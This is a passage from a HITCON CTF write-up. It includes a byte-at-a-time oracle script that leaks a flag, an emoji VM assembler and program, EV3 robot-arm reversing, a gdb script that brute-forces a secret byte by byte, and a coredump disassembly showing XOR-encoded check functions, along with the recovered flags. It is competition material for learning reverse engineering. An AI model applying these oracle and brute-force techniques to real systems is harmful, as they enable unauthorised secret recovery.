        write(b'\x00' * 16 * block + b'\x00' * i)
        checks += [read()]

    leak = b''
    for i in range(15, -1, -1):
        #for j in range(256):
        for j in string.printable:
            write(b'\x00' * 16 * block + b'\x00' * i + bytes([ord(j)]) + leak[::-1])
            if read() == checks[i]:
                leak += bytes([ord(j)])
                print(leak)
                break

    flag += leak[::-1]

print(flag)
```

flag : `hitcon{xxd?XDD!e45dc4df7d0b79}`

### EmojiVM
I created a simple assembler with this reversed opcode table:

```
1  🈳: nop
2  ➕: +
3  ➖: -
4  ❌: *
5  ❓: %
6  ❎: ^
7  👫: &
8  💀: <
9  💯: ==
10 🚀: jmp
11 🈶: jmp if true
12 🈚: jmp if false
13 ⏬: push back
14 🔝: pop top
15 📤: load?
16 📥: store?
17 🆕: malloc (at most 10) [size, malloc(size)]
18 🆓: free
19 📄: read
20 📝: write
21 🔡: write until nullbyte
22 🔢: cout
23 🛑: exit

1 ~ 10
😀😁😂🤣😜😄😅😆😉😊😍
```

```python
import re
import sys


opmap = {
    'nop':   '\U0001f233',
    'add':   '\U00002795',
    'sub':   '\U00002796',
    'mul':   '\U0000274c',
    'mod':   '\U00002753',
    'pow':   '\U0000274e',
    'and':   '\U0001f46b',
    'lt':    '\U0001f480',
    'eq':    '\U0001f4af',
    'jmp':   '\U0001f680',
    'jt':    '\U0001f236',
    'jf':    '\U0001f21a',
    'push':  '\U000023ec',
    'pop':   '\U0001f51d',
    'load':  '\U0001f4e4',
    'store': '\U0001f4e5',
    'alloc': '\U0001f195',
    'free':  '\U0001f193',
    'read':  '\U0001f4c4',
    'write': '\U0001f4dd',
    'puts':  '\U0001f521',
    'puti':  '\U0001f522',
    'exit':  '\U0001f6d1',
}

valmap = [
    '\U0001f600',
    '\U0001f601',
    '\U0001f602',
    '\U0001f923',
    '\U0001f61c',
    '\U0001f604',
    '\U0001f605',
    '\U0001f606',
    '\U0001f609',
    '\U0001f60a',
    '\U0001f60d',
]


def push(n):
    pc = 0
    if n < 0:
        raise NotImplementedError('QAQ')
    if n < 10:
        return opmap['push'] + valmap[int(n)], 2
    ns = list(str(n).strip('L'))
    ret = opmap['push'] + valmap[int(ns.pop(0))]
    pc += 2
    for i in ns:
        ret += opmap['push'] + valmap[10]
        pc += 2
        ret += opmap['mul']
        pc += 1
        ret += opmap['push'] + valmap[int(i)]
        pc += 2
        ret += opmap['add']
        pc += 1
    return ret, pc
    

out = []
with open(sys.argv[1]) as f:
    data = f.read()

data = re.sub(r';[^\n]*', '', data)
data = re.sub(r'[ \t]+', ' ', data)

labels = {}
pc = 0

for line in data.splitlines():
    line = line.strip()
    if line == '':
        continue

    print('debug: ', line)
    if line.endswith(':'):
        labels[line[:-1]] = pc
        continue

    op, *args = line.split(' ')
    if op not in opmap:
        print('Invalid op %s' % op, file=sys.stderr)
        exit(1)

    for arg in args[::-1]:
        arg = arg.strip()
        try:
            arg = int(arg, 0)
        except ValueError:
            out.append('label_' + arg)
            pc += 20
        else:
            code, pc_off = push(arg)
            out.append(code)
            pc += pc_off
        continue

    if op != 'push':
        out.append(opmap[op])
        pc += 1

print(out)

for i, e in enumerate(out):
    if not e.startswith('label_'):
        continue
    e = e[6:]
    if e not in labels:
        raise KeyError('Undefined label: %s' % e)
    e = push(labels[e])[0].ljust(20, opmap['nop'])
    assert len(e) == 20
    out[i] = e

with open(sys.argv[2], 'w') as f:
    f.write(''.join(out))
```

And it becomes a simple programming challange:

```asm
start:
    alloc 10

    alloc 10

    alloc 10

    ; Initialize const
    store 2 0 0x31
    store 2 1 0x20

    ; Initialize lhs
    load 2 0
    store 0 0
    
    load 2 1
    store 0 1

    store 0 2 0x2A

    load 2 1
    store 0 3

    load 2 0
    store 0 4

    load 2 1
    store 0 5

    store 0 6 0x3D

    load 2 1
    store 0 7

    ; Initialize reg
    store 1 0 0x1
    store 1 1 0x1

    loop_out:
        load 2 0
        store 0 4

        store 1 1 1

        loop_in:
            write 0

            load 1 0
            load 1 1
            mul
            puti

            puts 10 0

            ; cond_in
            load 1 1
            eq 9
            jt break_in

            load 0 4
            add 1
            store 0 4

            load 1 1
            add 1
            store 1 1

            jmp loop_in

        break_in:

        ; cond_out
        load 1 0
        eq 9
        jt break_out

        load 0 0
        add 1
        store 0 0

        load 1 0
        add 1
        store 1 0

        jmp loop_out

    break_out:
    exit
```

## Rev

### EV3 Arm

Use the step in `EV3 Payer` to extract the rbf file.

Upload the rbf to this website.
http://ev3treevis.azurewebsites.net/

Use some regular expression replace to these format.

```
B 35 -15
A 720 -75
B 35 15
A 360 75
B 35 -15
C 2 70
A 360 -75
B 35 15
A 720 75
C 1.5 70
B 35 -15
A 180 -75
B 35 15
A 180 -75
B 35 -15
A 360 -75
B 35 15
A 720 75
C 1.5 70
A 360 -75
B 35 -15
C 1.5 70
B 35 15
C 1 -70
A 90 75
B 35 -15
A 450 -75
B 35 15
A 720 75
C 4 70
A 360 -75
B 35 -15
C 2 -70
A 360 -75
C 2 70
B 35 15
A 720 75
C 3.5 70
A 360 -75
B 35 -15
C 2 -70
A 360 -75
C 2 70
A 420 75
B 35 15
A 300 75
C 1.5 70
A 320 -75
B 35 -15
A 400 -75
A 420 75
C' 2 60
A 120 15
A 480 -75
B 35 15
A 660 75
C 2 70
B 35 -15
C 0.5 -70
A 300 -75
C' 0.3 -90
A 120 -75
C' 0.3 90
A 300 -75
C 0.5 70
B 35 15
A 720 75
C 1.5 70
A 360 -75
B 35 -15
C' 2.2 35
A 360 -75
A 360 75
A 360 -75
A 420 75
B 35 15
A 300 75
C 1.5 70
B 35 -15
A 720 -75
B 35 15
A 360 75
B 35 -15
C 2 70
A 360 -75
B 35 15
A 720 75
C 1 70
A 360 -75
B 35 -15
C' 2.2 70
A 360 -75
A 420 75
A 600 -75
C 0.75 -70
B 35 15
C 0.75 70
A 900 75
C 1.5 70
A 720 -75
B 35 -15
C 2 70
B 35 15
A 720 75
C 1.5 70
A 360 -75
B 35 -15
A 400 -75
A 420 75
C' 2 60
A 120 15
A 480 -75
B 35 15
A 700 75
C 3.5 70
A 360 -75
B 35 -15
C 2 -70
A 360 -75
C 2 70
A 420 75
B 35 15
A 300 75
C 1.5 70
A 360 -75
B 35 -15
C 1.5 70
B 35 15
C 1 -70
A 90 75
B 35 -15
A 450 -75
B 35 15
A 720 75
C 2 70
A 720 -75
B 35 -15
C 2 70
B 35 15
A 720 75
C 1.5 70
B 35 -15
A 180 -75
B 35 15
A 180 -75
B 35 -15
A 720 -75
C' 1 -70
A 180 25
B 35 15
A 900 75
C 2.5 70
A 360 -75
B 35 -15
A 400 -75
A 120 75
C' 2 60
A 120 -15
A 480 75
B 35 15
A 280 75
C 3.5 70
A 360 -75
B 35 -15
A' 360 -15
C 2 -60
C 2 80
C 2 -60
B 35 15
C 2 70
A 720 75
C 1.5 70
A 360 -75
B 35 -15
C 1.5 70
B 35 15
C 1 -70
A 90 75
B 35 -15
A 450 -75
B 35 15
A 720 75
C 2 70
A 720 -75
B 35 -15
C 2 70
B 35 15
A 720 75
C 1.5 70
A 360 -75
B 35 -15
A 400 -75
A 120 75
C' 2 60
A 120 -15
A 480 75
B 35 15
A 280 75
C 3.5 70
A 360 -75
B 35 -15
A' 360 -15
C 2 -60
C 2 80
C 2 -60
B 35 15
C 2 70
A 720 75
C 1.5 70
A 540 -75
B 35 -15
C 2 70
A 240 75
C 2 -70
A 480 -75
C 2 70
B 35 15
A 780 75
C 2 70
A 720 -75
B 35 -15
C 2 70
B 35 15
A 720 75
C 1.5 70
A 360 -75
B 35 -15
C 1.5 70
B 35 15
C 1 -70
A 90 75
B 35 -15
A 450 -75
B 35 15
A 720 75
C 2.5 70
B 35 -15
A 720 -75
B 35 15
A 360 75
B 35 -15
C 2 70
A 360 -75
B 35 15
A 720 75
C 1.5 70
A 540 -75
B 35 -15
C 2 70
A 240 75
C 2 -70
A 480 -75
C 2 70
B 35 15
A 780 75
C 1.5 70
A 720 -75
B 35 -15
C 2 70
B 35 15
A 720 75
C 1.5 70
A 720 -75
B 35 -15
C 2 70
A 420 75
C 2 -70
A 800 -75
B 35 15
C 2 70
A 1100 75
C 1.5 70
A 360 -75
B 35 -15
A 400 -75
A 420 75
C' 1.5 60
A 120 15
A 60 -75
B 35 15
A 280 75
C 1.5 70
B 35 -15
A 180 -75
B 35 15
A 180 -75
B 35 -15
A 360 -75
B 35 15
A 720 75
C 1.5 70
A 360 -75
B 35 -15
A 400 -75
A 420 75
C' 2 60
A 120 15
A 480 -75
B 35 15
A 700 75
C 1.5 70
A 360 -75
B 35 -15
C 1.5 70
B 35 15
C 1 -70
A 90 75
B 35 -15
A 450 -75
B 35 15
A 720 75
C 2.5 70
A 540 -75
B 35 -15
C 2 70
A 240 75
C 2 -70
A 480 -75
C 2 70
B 35 15
A 780 75
C 1.5 70
A 360 -75
B 35 -15
A 400 -75
A 420 75
C' 1.5 60
A 120 15
A 60 -75
B 35 15
A 280 75
C 2 70
B 35 -15
C 0.5 70
A 300 -75
C' 0.3 90
A 120 -75
C' 0.3 -90
A 300 -75
C 0.5 -70
B 35 15
A 720 75
D
```

And write this code to generate the image.

```C++
void tmp(){
    Pic png;
    for(int i=0;i<300;i++){
        png.push_back(vector<Color>(3000,Color(0,0,0)));
    }
    int dwn=false;
    double x=50,y=50;
    double vx=0,vy=0;
    int tx=0,ty=0;
    int wait_fin=1;
    while(true){
        char m[10];

        if(wait_fin||(!tx&&!ty)){
            scanf("%s",m);
            //printf("%s\n",m);
            if(m[0]=='D'){
                break;
            }
            double pw, rd;
            scanf("%lf%lf",&rd,&pw);
            if(m[0]=='B'){
                dwn=pw<0;
            }
            if(m[0]=='A'){
                pw/=100;
                ty+=rd/abs(pw)/4/2;
                vy=-pw;
            }
            if(m[0]=='C'){
                pw/=100;
                rd*=40;
                tx+=rd/abs(pw)/2;
                vx=pw;
            }
            if(m[1]=='\'')
                wait_fin=1;
            else
                wait_fin=0;
        }
        if(dwn)png[min(max((int)y,0),250)][min(max((int)x,0),2950)]=Color(255,255,255);
        if(tx>0){
            tx=max(tx-1,0);
            x+=vx;
        }
        if(ty>0){
            ty=max(ty-1,0);
            y+=vy;
        }
        //printf("%d %d %d %d %d %d\n",x,y,vx,vy,tx,ty);
    }
    WritePNG("result.png",png);
}
```

![](https://i.imgur.com/Ukh9L7o.png)

`hitcon{why_not_just_use_the_printer}`


### EmojiVM

To solve this chal, I didn't fully understand the emoji byte code in `chal.evm`

I found that there are some `==` instructions. I guessed that it will do something on our input secret ,then compare with the correct secret.

After using `gdb` on `emojivm`. I noticed that the comparison is done byte by byte. It indicate that I can brute force the correct secret byte by byte.

So I write the following gdb python script to get the correct input.


```python=
import gdb
import string
import codecs
s = str(codecs.decode('8e63cd124b5815175122d904512c1915862cd14c842e200618', 'hex'))[2:-1]
print(s)
a_bytes = bytes.fromhex('8e63cd124b5815175122d904512c1915862cd14c842e200618')
print(a_bytes)
flag="h999-BB00-0000-0000-0000"
gdb.execute("b *0x0000555555559283")
pre=""
been=[]
for i in range(len(pre),len(a_bytes)):
  print(a_bytes[i])
  if flag[i]=="-":
    pre+="-"
    continue
  for j in string.printable:
    f=open("haha","w")
    f.write(pre+j+"h999-BB00-0000-0000-f14g"[len(pre)+1:]+"\n")
    f.close()  
    t=a_bytes[i]
    if t>=0x80:
      gdb.execute("cond 1 *0x7fffffffdbd8 == 0xffffffffffffff"+hex(t)[2:])
    else:
      gdb.execute("cond 1 *0x7fffffffdbd8 == "+hex(t))
      print("cond 1 *0x7fffffffdba8 == "+hex(t))
    gdb.execute('r chal.evm < haha')
    o=gdb.execute('p *0x7fffffffdbd0', to_string=True)
    o=str(o).split()[2]
    while o in been:
      gdb.execute('c')
      o=gdb.execute('p *0x7fffffffdbd0', to_string=True)
      o=str(o).split()[2]
    o=gdb.execute('p *0x7fffffffdbe0', to_string=True)
    o=str(o).split()[2]
    o2=gdb.execute('p *0x7fffffffdbd8', to_string=True)
    o2=str(o2).split()[2]
    if o==o2:
      pre+=j
      open("flag","w").write(pre+"\n")
      o=gdb.execute('p *0x7fffffffdbd0', to_string=True)
      o=str(o).split()[2]
      been.append(o)
      break

```

The corrct secret is `plis-g1v3-me33-th3e-f14g`, and the flag is`hitcon{R3vers3_Da_3moj1}`

### Core Dumb

`gdb -c core-3c5a47af728e9968fd7a6bb41fbf573cd52677bc` can help you analyze the coredump file.

`bt` can help you figure out the base address of `text segment`

```
gdb-peda$ bt
#0  0x00007fffffffd980 in ?? ()
#1  0x0000555555554c5c in ?? ()
#2  0x0000555555756ac0 in ?? ()
#3  0x0000001100000000 in ?? ()
#4  0x00000000001e7620 in ?? ()
#5  0x00007fffffffd980 in ?? ()
#6  0x61d1502acc982937 in ?? ()
#7  0x748161623a26a1a5 in ?? ()
#8  0x00000000000000a1 in ?? ()
#9  0x0000000000000000 in ?? ()

```

It tells us that the base address is `0x0000555555554000`

So I dump the memory and found the entry point is `0x780 + 0x0000555555554000` by using `readelf`

Maybe you can use `IDA pro` to analyze the code. But I only use `gdb`, and directly read the assembly with the help of `x/i`

The main function is at `0x555555554c7e`

```python
main:
   0x555555554c7e:	push   rbp
   0x555555554c7f:	mov    rbp,rsp
   0x555555554c82:	sub    rsp,0x150
   0x555555554c89:	mov    DWORD PTR [rbp-0x144],edi
   0x555555554c8f:	mov    QWORD PTR [rbp-0x150],rsi
   0x555555554c96:	mov    rax,QWORD PTR fs:0x28
   0x555555554c9f:	mov    QWORD PTR [rbp-0x8],rax
   0x555555554ca3:	xor    eax,eax
   0x555555554ca5:	
    mov    rax,QWORD PTR [rip+0x201e84]        # 0x555555756b30
   0x555555554cac:	mov    ecx,0x0
   0x555555554cb1:	mov    edx,0x2
   0x555555554cb6:	mov    esi,0x0
   0x555555554cbb:	mov    rdi,rax
   0x555555554cbe:	call   0x555555554750 # maybe setbuf()
   0x555555554cc3:	
    mov    rax,QWORD PTR [rip+0x201e56]        # 0x555555756b20
   0x555555554cca:	mov    ecx,0x0
   0x555555554ccf:	mov    edx,0x2
   0x555555554cd4:	mov    esi,0x0
   0x555555554cd9:	mov    rdi,rax
   0x555555554cdc:	call   0x555555554750 # maybe setbuf()
   0x555555554ce1:	
    mov    rax,QWORD PTR [rip+0x201e58]        # 0x555555756b40
   0x555555554ce8:	mov    ecx,0x0
   0x555555554ced:	mov    edx,0x2
   0x555555554cf2:	mov    esi,0x0
   0x555555554cf7:	mov    rdi,rax
   0x555555554cfa:	call   0x555555554750 # maybe setbuf()
   0x555555554cff:	mov    DWORD PTR [rbp-0x140],0x0
   0x555555554d09:	lea    rax,[rip+0x201db0]        # 0x555555756ac0
   0x555555554d10:	mov    QWORD PTR [rbp-0x130],rax
   0x555555554d17:	lea    rax,[rip+0x201302]        # 0x555555756020 encoded check1 function 
   0x555555554d1e:	mov    QWORD PTR [rbp-0x120],rax
   0x555555554d25:	lea    rax,[rip+0x201414]        # 0x555555756140 encoded check2 function
   0x555555554d2c:	mov    QWORD PTR [rbp-0x110],rax
   0x555555554d33:	lea    rax,[rip+0x2015c6]        # 0x555555756300 encoded check3 function
   0x555555554d3a:	mov    QWORD PTR [rbp-0x100],rax
   0x555555554d41:	lea    rax,[rip+0x2018b8]        # 0x555555756600 encoded check4 function
   0x555555554d48:	mov    QWORD PTR [rbp-0xf0],rax
   0x555555554d4f:	lea    rax,[rip+0x201caa]        # 0x555555756a00 encoded check5 function
   0x555555554d56:	mov    QWORD PTR [rbp-0xe0],rax
   0x555555554d5d:	mov    DWORD PTR [rbp-0x140],0x1
   0x555555554d67:	jmp    0x555555554ddc
   0x555555554d69:	mov    eax,DWORD PTR [rbp-0x140]
   0x555555554d6f:	sub    eax,0x1
   0x555555554d72:	cdqe   
   0x555555554d74:	lea    rdx,[rax*4+0x0]
   0x555555554d7c:	lea    rax,[rip+0x201d5d]        # 0x555555756ae0
   0x555555554d83:	mov    eax,DWORD PTR [rdx+rax*1]
   0x555555554d86:	mov    edx,DWORD PTR [rbp-0x140]
   0x555555554d8c:	movsxd rdx,edx
   0x555555554d8f:	shl    rdx,0x4
   0x555555554d93:	add    rdx,rbp
   0x555555554d96:	sub    rdx,0x128
   0x555555554d9d:	mov    DWORD PTR [rdx],eax
   0x555555554d9f:	mov    eax,DWORD PTR [rbp-0x140]
   0x555555554da5:	sub    eax,0x1
   0x555555554da8:	cdqe   
   0x555555554daa:	lea    rdx,[rax*4+0x0]
   0x555555554db2:	lea    rax,[rip+0x201d47]        # 0x555555756b00
   0x555555554db9:	mov    eax,DWORD PTR [rdx+rax*1]
   0x555555554dbc:	mov    edx,DWORD PTR [rbp-0x140]
   0x555555554dc2:	movsxd rdx,edx
   0x555555554dc5:	shl    rdx,0x4
   0x555555554dc9:	add    rdx,rbp
   0x555555554dcc:	sub    rdx,0x124
   0x555555554dd3:	mov    DWORD PTR [rdx],eax
   0x555555554dd5:	add    DWORD PTR [rbp-0x140],0x1
   0x555555554ddc:	cmp    DWORD PTR [rbp-0x140],0x5
   0x555555554de3:	jle    0x555555554d69
   0x555555554de5:	
    mov    eax,DWORD PTR [rip+0x201d09]        # 0x555555756af4
   0x555555554deb:	mov    DWORD PTR [rbp-0x128],eax
   0x555555554df1:	
    mov    eax,DWORD PTR [rip+0x201d1d]        # 0x555555756b14
   0x555555554df7:	mov    DWORD PTR [rbp-0x124],eax
   0x555555554dfd:	mov    rdx,QWORD PTR [rbp-0x130]
   0x555555554e04:	mov    rax,QWORD PTR [rbp-0x128]
   0x555555554e0b:	mov    rdi,rdx
   0x555555554e0e:	mov    rsi,rax
   0x555555554e11:	call   0x555555554bd8 # useless test function
   0x555555554e16:	mov    DWORD PTR [rbp-0x13c],eax
   0x555555554e1c:	cmp    DWORD PTR [rbp-0x13c],0x1337
   0x555555554e26:	je     0x555555554e3e
   0x555555554e28:	lea    rdi,[rip+0x3ec]        # 0x55555555521b
   0x555555554e2f:	call   0x555555554710 # puts "Test failed !"
   0x555555554e34:	mov    eax,0x1
   0x555555554e39:	jmp    0x555555555174
   0x555555554e3e:	mov    QWORD PTR [rbp-0xd0],0x0
   0x555555554e49:	mov    QWORD PTR [rbp-0xc8],0x0
   0x555555554e54:	mov    QWORD PTR [rbp-0xc0],0x0
   0x555555554e5f:	mov    QWORD PTR [rbp-0xb8],0x0
   0x555555554e6a:	mov    QWORD PTR [rbp-0xb0],0x0
   0x555555554e75:	mov    QWORD PTR [rbp-0xa8],0x0
   0x555555554e80:	mov    QWORD PTR [rbp-0xa0],0x0
   0x555555554e8b:	mov    DWORD PTR [rbp-0x98],0x0
   0x555555554e95:	mov    QWORD PTR [rbp-0x90],0x0
   0x555555554ea0:	mov    QWORD PTR [rbp-0x88],0x0
   0x555555554eab:	mov    QWORD PTR [rbp-0x80],0x0
   0x555555554eb3:	mov    QWORD PTR [rbp-0x78],0x0
   0x555555554ebb:	mov    QWORD PTR [rbp-0x70],0x0
   0x555555554ec3:	mov    QWORD PTR [rbp-0x68],0x0
   0x555555554ecb:	mov    QWORD PTR [rbp-0x60],0x0
   0x555555554ed3:	mov    DWORD PTR [rbp-0x58],0x0
   0x555555554eda:	mov    QWORD PTR [rbp-0x50],0x0
   0x555555554ee2:	mov    QWORD PTR [rbp-0x48],0x0
   0x555555554eea:	mov    QWORD PTR [rbp-0x40],0x0
   0x555555554ef2:	mov    QWORD PTR [rbp-0x38],0x0
   0x555555554efa:	mov    QWORD PTR [rbp-0x30],0x0
   0x555555554f02:	mov    QWORD PTR [rbp-0x28],0x0
   0x555555554f0a:	mov    QWORD PTR [rbp-0x20],0x0
   0x555555554f12:	mov    DWORD PTR [rbp-0x18],0x0
   0x555555554f19:	lea    rax,[rbp-0xd0]
   0x555555554f20:	mov    QWORD PTR [rbp-0x138],rax
   0x555555554f27:	lea    rdi,[rip+0x2fb]        # 0x555555555229
   0x555555554f2e:	mov    eax,0x0
   0x555555554f33:	call   0x555555554730 # printf("Please enter the flag: ")
   0x555555554f38:	lea    rax,[rbp-0xd0]
   0x555555554f3f:	mov    edx,0x37
   0x555555554f44:	mov    rsi,rax
   0x555555554f47:	mov    edi,0x0
   0x555555554f4c:	call   0x555555554740 # supposed read(0,rbp-0xd0,0x37)
   0x555555554f51:	jmp    0x555555554f83
   0x555555554f53:	mov    rax,QWORD PTR [rbp-0x138]
   0x555555554f5a:	movzx  eax,BYTE PTR [rax]
   0x555555554f5d:	cmp    al,0xa
   0x555555554f5f:	je     0x555555554f6f
   0x555555554f61:	mov    rax,QWORD PTR [rbp-0x138]
   0x555555554f68:	movzx  eax,BYTE PTR [rax]
   0x555555554f6b:	cmp    al,0xd
   0x555555554f6d:	jne    0x555555554f7b
   0x555555554f6f:	mov    rax,QWORD PTR [rbp-0x138]
   0x555555554f76:	mov    BYTE PTR [rax],0x0
   0x555555554f79:	jmp    0x555555554f91
   0x555555554f7b:	add    QWORD PTR [rbp-0x138],0x1
   0x555555554f83:	mov    rax,QWORD PTR [rbp-0x138]
   0x555555554f8a:	movzx  eax,BYTE PTR [rax]
   0x555555554f8d:	test   al,al
   0x555555554f8f:	jne    0x555555554f53
   0x555555554f91:	lea    rax,[rbp-0xd0]
   0x555555554f98:	mov    rdi,rax
   0x555555554f9b:	call   0x55555555488a # strlen(rbp-0xd0)
   0x555555554fa0:	cmp    eax,0x34
   0x555555554fa3:	je     0x555555554faf # strlen(rbp-0xd0) = 0x34
   0x555555554fa5:	mov    eax,0x0
   0x555555554faa:	call   0x555555554949
   0x555555554faf:	lea    rcx,[rbp-0xd0]
   0x555555554fb6:	lea    rax,[rbp-0x90]
   0x555555554fbd:	mov    edx,0xa
   0x555555554fc2:	mov    rsi,rcx
   0x555555554fc5:	mov    rdi,rax
   0x555555554fc8:	call   0x5555555548bc # supposed strncpy(rbp-0x90,rbp-0xd0,0xa)
   0x555555554fcd:	lea    rdx,[rbp-0x90]
   0x555555554fd4:	mov    rsi,QWORD PTR [rbp-0x120] # encoded check1 function 
   0x555555554fdb:	mov    rax,QWORD PTR [rbp-0x118] # xor key1 
   0x555555554fe2:	mov    ecx,0xa
   0x555555554fe7:	mov    rdi,rsi
   0x555555554fea:	mov    rsi,rax
   0x555555554fed:	call   0x555555554a38 # decode check function and check the flag
   0x555555554ff2:	lea    rax,[rbp-0x90]
   0x555555554ff9:	mov    esi,0x37
   0x555555554ffe:	mov    rdi,rax
   0x555555555001:	call   0x55555555490f # clear buf rbp-0x90
   0x555555555006:	lea    rax,[rbp-0xd0]
   0x55555555500d:	lea    rcx,[rax+0xa]
   0x555555555011:	lea    rax,[rbp-0x90]
   0x555555555018:	mov    edx,0x8
   0x55555555501d:	mov    rsi,rcx
   0x555555555020:	mov    rdi,rax
   0x555555555023:	call   0x5555555548bc # supposed strncpy(rbp-0x90,rbp-0xd0,0x8)
   0x555555555028:	lea    rdx,[rbp-0x90]
   0x55555555502f:	mov    rcx,QWORD PTR [rbp-0x110] # encoded check2 function
   0x555555555036:	mov    rax,QWORD PTR [rbp-0x108] # xor key2
   0x55555555503d:	mov    rdi,rcx
   0x555555555040:	mov    rsi,rax
   0x555555555043:	call   0x555555554b0c # decode check function and check the flag
   0x555555555048:	lea    rax,[rbp-0x90]
   0x55555555504f:	mov    esi,0x37
   0x555555555054:	mov    rdi,rax
   0x555555555057:	call   0x55555555490f
   0x55555555505c:	lea    rax,[rbp-0xd0]
   0x555555555063:	lea    rcx,[rax+0x12]
   0x555555555067:	lea    rax,[rbp-0x90]
   0x55555555506e:	mov    edx,0x12
   0x555555555073:	mov    rsi,rcx
   0x555555555076:	mov    rdi,rax
   0x555555555079:	call   0x5555555548bc # supposed strncpy(rbp-0x90,rbp-0xd0,0x12)
   0x55555555507e:	lea    rdx,[rbp-0x90]
   0x555555555085:	mov    rsi,QWORD PTR [rbp-0x100] # encoded check3 function
   0x55555555508c:	mov    rax,QWORD PTR [rbp-0xf8] # xor key3
   0x555555555093:	mov    ecx,0x12
   0x555555555098:	mov    rdi,rsi
   0x55555555509b:	mov    rsi,rax
   0x55555555509e:	call   0x555555554a38 # decode check function and check the flag
   0x5555555550a3:	lea    rax,[rbp-0x90]
   0x5555555550aa:	mov    esi,0x37
   0x5555555550af:	mov    rdi,rax
   0x5555555550b2:	call   0x55555555490f
   0x5555555550b7:	lea    rax,[rbp-0xd0]
   0x5555555550be:	lea    rcx,[rax+0x24]
   0x5555555550c2:	lea    rax,[rbp-0x90]
   0x5555555550c9:	mov    edx,0xc
   0x5555555550ce:	mov    rsi,rcx
   0x5555555550d1:	mov    rdi,rax
   0x5555555550d4:	call   0x5555555548bc # supposed strncpy(rbp-0x90,rbp-0xd0,0xc)
   0x5555555550d9:	lea    rdx,[rbp-0x90]
   0x5555555550e0:	mov    rsi,QWORD PTR [rbp-0xf0] # encoded check4 function
   0x5555555550e7:	mov    rax,QWORD PTR [rbp-0xe8] # xor key4
   0x5555555550ee:	mov    ecx,0xc
   0x5555555550f3:	mov    rdi,rsi
   0x5555555550f6:	mov    rsi,rax
   0x5555555550f9:	call   0x555555554a38 # decode check function and check the flag
   0x5555555550fe:	lea    rax,[rbp-0x90]
   0x555555555105:	mov    esi,0x37
   0x55555555510a:	mov    rdi,rax
   0x55555555510d:	call   0x55555555490f
   0x555555555112:	lea    rax,[rbp-0xd0]
   0x555555555119:	lea    rcx,[rax+0x30]
   0x55555555511d:	lea    rax,[rbp-0x90]
   0x555555555124:	mov    edx,0x4
   0x555555555129:	mov    rsi,rcx
   0x55555555512c:	mov    rdi,rax
   0x55555555512f:	call   0x5555555548bc # supposed strncpy(rbp-0x90,rbp-0xd0,0x4)
   0x555555555134:	lea    rdx,[rbp-0x90]
   0x55555555513b:	mov    rcx,QWORD PTR [rbp-0xe0] # encoded check5 function
   0x555555555142:	mov    rax,QWORD PTR [rbp-0xd8] # xor key5
   0x555555555149:	mov    rdi,rcx
   0x55555555514c:	mov    rsi,rax
   0x55555555514f:	call   0x555555554b0c # decode check function and check the flag
   0x555555555154:	lea    rax,[rbp-0xd0]
   0x55555555515b:	mov    rsi,rax
   0x55555555515e:	lea    rdi,[rip+0xe3]        # 0x555555555248
   0x555555555165:	mov    eax,0x0
   0x55555555516a:	call   0x555555554730 # print("Congratz ! The flag is hitcon{%s} :)\n",rbp-0xd0)
   0x55555555516f:	mov    eax,0x0
   0x555555555174:	mov    rcx,QWORD PTR [rbp-0x8]
   0x555555555178:	xor    rcx,QWORD PTR fs:0x28
   0x555555555181:	je     0x555555555188
   0x555555555183:	call   0x555555554720
   0x555555555188:	leave  
   0x555555555189:	ret   

```


First, it calls a test function which is totally useless. So we can just skip that part. By the way, it seems like that this program crashed in the test function.

Then I found that there is a decode function that can decode the check functions for flag. It's at `0x555555554a38` and `0x555555554b0c`

It use xor to encode the check functions. In `gdb` yout can easily get the addresses of encoded functions and the xor keys

```
                 encoded func   xor key     function length
0x7fffffffded8:  0x555555756020 0x8eb5034a  0x0000010b	
0x7fffffffdee8:  0x555555756140 0xc6ffda44  0x000001b1	
0x7fffffffdef8:  0x555555756300 0x85ea3fe1  0x000002e4	
0x7fffffffdf08:  0x555555756600 0x42ad9ef2  0x000003e6	
0x7fffffffdf18:  0x555555756a00 0x77e2535c  0x000000bf
```

We have five check functions here. And I manually decode the functions and read the assembly.


```
check1:
   0:   55                      push   rbp
   1:   48 89 e5                mov    rbp,rsp
   4:   48 83 ec 60             sub    rsp,0x60
   8:   48 89 7d a8             mov    QWORD PTR [rbp-0x58],rdi
   c:   89 75 a4                mov    DWORD PTR [rbp-0x5c],esi
   f:   64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  16:   00 00 
  18:   48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  1c:   31 c0                   xor    eax,eax
  1e:   c7 45 c0 44 75 4d 62    mov    DWORD PTR [rbp-0x40],0x624d7544
  25:   c6 45 c4 00             mov    BYTE PTR [rbp-0x3c],0x0
  29:   48 c7 45 d0 00 00 00    mov    QWORD PTR [rbp-0x30],0x0
  30:   00 
  31:   48 c7 45 d8 00 00 00    mov    QWORD PTR [rbp-0x28],0x0
  38:   00 
  39:   48 c7 45 e0 00 00 00    mov    QWORD PTR [rbp-0x20],0x0
  40:   00 
  41:   c7 45 e8 00 00 00 00    mov    DWORD PTR [rbp-0x18],0x0
  48:   66 c7 45 ec 00 00       mov    WORD PTR [rbp-0x14],0x0
  4e:   48 b8 49 26 72 35 76    movabs rax,0x413317635722649
  55:   31 13 04 
  58:   48 89 45 c5             mov    QWORD PTR [rbp-0x3b],rax
  5c:   66 c7 45 cd 4e 5e       mov    WORD PTR [rbp-0x33],0x5e4e
  62:   c6 45 cf 00             mov    BYTE PTR [rbp-0x31],0x0
  66:   c7 45 b8 00 00 00 00    mov    DWORD PTR [rbp-0x48],0x0
  6d:   c7 45 bc 01 00 00 00    mov    DWORD PTR [rbp-0x44],0x1
  74:   c7 45 b8 00 00 00 00    mov    DWORD PTR [rbp-0x48],0x0
  7b:   eb 39                   jmp    0xb6
  7d:   8b 45 b8                mov    eax,DWORD PTR [rbp-0x48]
  80:   48 63 d0                movsxd rdx,eax
  83:   48 8b 45 a8             mov    rax,QWORD PTR [rbp-0x58]
  87:   48 01 d0                add    rax,rdx
  8a:   0f b6 08                movzx  ecx,BYTE PTR [rax]
  8d:   8b 45 b8                mov    eax,DWORD PTR [rbp-0x48]
  90:   99                      cdq    
  91:   c1 ea 1e                shr    edx,0x1e
  94:   01 d0                   add    eax,edx
  96:   83 e0 03                and    eax,0x3
  99:   29 d0                   sub    eax,edx
  9b:   48 98                   cdqe   
  9d:   0f b6 44 05 c0          movzx  eax,BYTE PTR [rbp+rax*1-0x40]
  a2:   83 e8 07                sub    eax,0x7
  a5:   31 c1                   xor    ecx,eax
  a7:   89 ca                   mov    edx,ecx
